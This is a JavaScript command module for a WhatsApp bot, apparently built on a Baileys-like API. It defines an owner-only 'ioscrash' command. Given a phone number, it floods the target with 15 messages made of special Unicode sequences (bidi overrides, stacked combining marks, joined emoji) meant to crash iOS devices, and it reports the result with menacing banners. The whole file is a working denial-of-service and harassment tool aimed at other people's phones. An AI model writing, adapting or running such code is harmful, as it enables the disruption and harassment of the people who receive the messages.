export default {
  name: 'ioscrash',
  description: 'Crash iOS devices with special characters',
  category: 'dangerous',
  aliases: ['ios', 'iphone'],
  ownerOnly: true,
  async execute(sock, msg, args, prefix) {
    const chatId = msg.key.remoteJid;
    const target = args[0];

    if (!target) {
      return sock.sendMessage(chatId, {
        text: `╭━━━〔 ☠️ IOS CRASH 〕━━━┈⊷
┃ Usage: ${prefix}ioscrash <number>
┃ 
┃ Example: ${prefix}ioscrash 27797352930
┃ 
┃ ⚠️ Only works on iOS!
┃ 🧛 "The darkness crashes Apple."
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
    }

    const userJid = target.includes('@') ? target : `${target}@s.whatsapp.net`;

    await sock.sendMessage(chatId, {
      text: `╭━━━〔 ☠️ IOS CRASH SENT 〕━━━┈⊷
┃ 👤 Target: ${userJid}
┃ 🧛 "The darkness crashes Apple..."
╰━━━━━━━━━━━━━━━┈⊷`
    }, { quoted: msg });

    try {
      const crashChars = [
        '🫸🫷🫸🫷🫸🫷🫸🫷',
        '‮⁦⁦⁦⁩⁩⁩‍👨‍👩‍👧‍👦‍👨‍👩‍👧‍👦',
        '⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤⃤',
        '̵̶̷̸̵̶̷̸̵̶̷̸̵̶̷̸',
        '𖦹𖦺𖦻𖦼𖦽𖦾𖦿𖧀𖧁'
      ];

      for (let i = 0; i < 15; i++) {
        try {
          await sock.sendMessage(userJid, {
            text: crashChars[i % crashChars.length].repeat(5)
          });
          await new Promise(resolve => setTimeout(resolve, 150));
        } catch {}
      }

      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ✅ IOS CRASH SENT 〕━━━┈⊷
┃ 👤 ${target} iOS crash sent!
┃ 🧛 "The darkness crashes Apple."
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
    } catch (error) {
      await sock.sendMessage(chatId, {
        text: `╭━━━〔 ❌ ERROR 〕━━━┈⊷
┃ ${error.message}
╰━━━━━━━━━━━━━━━┈⊷`
      }, { quoted: msg });
    }
  }
};
